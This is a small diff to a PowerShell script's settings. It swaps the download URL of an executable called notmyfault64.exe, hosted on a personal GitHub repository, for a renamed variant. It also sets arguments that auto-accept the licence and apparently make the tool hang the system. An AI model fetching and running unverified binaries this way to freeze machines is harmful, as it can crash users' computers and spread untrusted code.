@@ -1,6 +1,6 @@
 # Configuration
 $targetDirectory = "D:\Setups or somethin'"
-$testlimitUrl = "https://github.com/AFRAID-FOR-YOU/Powershell-things/raw/refs/heads/main/notmyfault64.exe"
+$testlimitUrl = "https://github.com/AFRAID-FOR-YOU/Powershell-things/raw/refs/heads/main/notmyfault64c.exe"
 $testlimitPath = "$targetDirectory\notmyfault64.exe"
 $testArgs = "hang 0x01 -accepteula"  # Added -accepteula to accept EULA automatically
 
